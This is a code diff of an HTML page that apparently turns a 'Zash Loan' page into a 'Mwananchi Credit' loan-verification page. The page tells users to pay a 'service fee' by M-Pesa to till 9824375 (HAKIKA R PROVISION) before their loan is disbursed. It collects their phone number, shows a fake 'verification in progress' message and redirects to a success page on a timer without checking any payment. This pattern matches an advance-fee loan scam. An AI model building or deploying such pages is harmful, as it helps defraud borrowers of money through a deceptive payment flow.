@@ -3,57 +3,71 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Loan Details - Zash Loan</title>
+  <title>Loan Verification - Mwananchi Credit</title>
   <script src="https://cdn.tailwindcss.com"></script>
 </head>
-<body class="bg-gradient-to-br from-red-700 to-red-500 text-white min-h-screen p-6">
-  <div class="max-w-3xl mx-auto space-y-6">
+<body class="bg-gradient-to-br from-blue-900 via-blue-800 to-orange-500 min-h-screen flex flex-col justify-center items-center text-white p-4">
+  
+  <div class="bg-white text-gray-800 rounded-2xl shadow-lg w-full max-w-md p-6">
+    <div class="flex items-center space-x-3 mb-4">
+      <img src="logo.png" alt="Mwananchi Credit Logo" class="w-12 h-12">
+      <h1 class="text-2xl font-bold text-blue-900">Loan Verification</h1>
+    </div>
+
+    <p class="text-sm text-gray-600 mb-4">
+      Please complete your payment to confirm your loan disbursement.
+    </p>
 
     <!-- Loan Details -->
-    <div class="text-center">
-      <h1 class="text-3xl font-bold">Loan Details</h1>
-      <p class="text-lg mt-2">Review your loan information below</p>
+    <div class="bg-gray-100 p-4 rounded-lg mb-4">
+      <p class="text-lg font-semibold text-gray-800">Loan Amount: <span id="loanAmount" class="text-blue-900"></span></p>
+      <p class="text-lg font-semibold text-gray-800">Service Fee: <span id="serviceFee" class="text-orange-600"></span></p>
     </div>
 
-    <div class="bg-white/10 p-6 rounded-lg shadow-lg space-y-4">
-      <p class="text-lg">Loan Amount: <span id="loanAmount" class="font-bold"></span></p>
-      <p class="text-lg">Interest: <span id="interest" class="font-bold"></span></p>
-      <p class="text-lg">Service Fee: <span id="serviceFee" class="font-bold"></span></p>
-      <p class="text-lg">Total to Repay: <span id="totalRepay" class="font-bold"></span></p>
-      <p class="text-lg">Due Date: <span id="dueDate" class="font-bold"></span></p>
+    <!-- Payment Instructions -->
+    <h2 class="text-lg font-bold text-blue-900 mb-2">How to Pay</h2>
+    <ol class="list-decimal list-inside space-y-1 text-gray-700">
+      <li>Go to M-Pesa Menu on your phone.</li>
+      <li>Select <strong>Lipa na M-Pesa</strong>.</li>
+      <li>Select <strong>Buy Goods and Services</strong>.</li>
+      <li>Enter Till Number: <strong class="text-blue-900">9824375</strong> (HAKIKA R PROVISION).</li>
+      <li>Enter Amount: <strong class="text-orange-600">Service Fee</strong> as shown above.</li>
+      <li>Enter your M-Pesa PIN and confirm.</li>
+      <li>You will receive an M-Pesa confirmation SMS.</li>
+    </ol>
+
+    <!-- Phone Input -->
+    <div class="mt-4">
+      <label for="phone" class="block text-gray-700 font-medium mb-1">Enter M-Pesa Number</label>
+      <input type="tel" id="phone" placeholder="e.g. 0712345678" 
+        class="w-full p-2 rounded-lg border border-gray-300 focus:ring-2 focus:ring-orange-500">
     </div>
 
-<!-- Payment Details Section -->
-<div class="bg-gray-800 p-4 rounded-xl mb-6 text-white">
-  <h2 class="text-lg font-semibold mb-2">Payment Details</h2>
-  <p class="text-sm">Pay to <span class="font-bold">Hakika R Provision</span></p>
-  <p class="text-sm">Till Number: <span class="font-bold">9824375</span></p>
-  <p class="text-sm">Amount: <span class="font-bold">services</span></p>
-</div>
+    <!-- Confirm Button -->
+    <button onclick="confirmPayment()" 
+      class="mt-6 w-full bg-blue-900 text-white py-2 rounded-lg font-semibold hover:bg-blue-800 transition">
+      Confirm Payment
+    </button>
 
-<!-- Existing Paste Text Box -->
-<div class="bg-gray-800 p-4 rounded-xl">
-  <label for="transactionCode" class="block text-sm font-medium mb-2">Paste M-Pesa Transaction Code:</label>
-  <input type="text" id="transactionCode" class="w-full p-3 bg-transparent border border-gray-600 rounded-lg focus:outline-none focus:border-red-500">
-</div>
-
-
+    <p id="statusMessage" class="mt-4 text-center text-sm text-green-600 hidden">Payment verification in progress...</p>
   </div>
 
   <script>
-    // Get stored values from localStorage
-    const loanAmount = parseFloat(localStorage.getItem('loanAmount')) || 0;
-    const interest = parseFloat(localStorage.getItem('interest')) || 0;
-    const serviceFee = Math.floor(parseFloat(localStorage.getItem('serviceFee')) || 0);
-    const totalRepay = parseFloat(localStorage.getItem('totalRepay')) || 0;
-    const dueDate = localStorage.getItem('dueDate') || 'N/A';
+    // Load loan details from localStorage
+    document.getElementById('loanAmount').textContent = localStorage.getItem('loanAmount') || 'KSh 0';
+    document.getElementById('serviceFee').textContent = localStorage.getItem('serviceFee') || 'KSh 0';
 
-    // Display values
-    document.getElementById('loanAmount').textContent = `KSh ${loanAmount.toLocaleString()}`;
-    document.getElementById('interest').textContent = `KSh ${interest.toLocaleString()}`;
-    document.getElementById('serviceFee').textContent = `KSh ${serviceFee.toLocaleString()}`;
-    document.getElementById('totalRepay').textContent = `KSh ${totalRepay.toLocaleString()}`;
-    document.getElementById('dueDate').textContent = dueDate;
+    function confirmPayment() {
+      const phone = document.getElementById('phone').value.trim();
+      if (!phone) {
+        alert("Please enter your M-Pesa number.");
+        return;
+      }
+      document.getElementById('statusMessage').classList.remove('hidden');
+      setTimeout(() => {
+        window.location.href = "success.html";
+      }, 3000);
+    }
   </script>
 </body>
 </html>
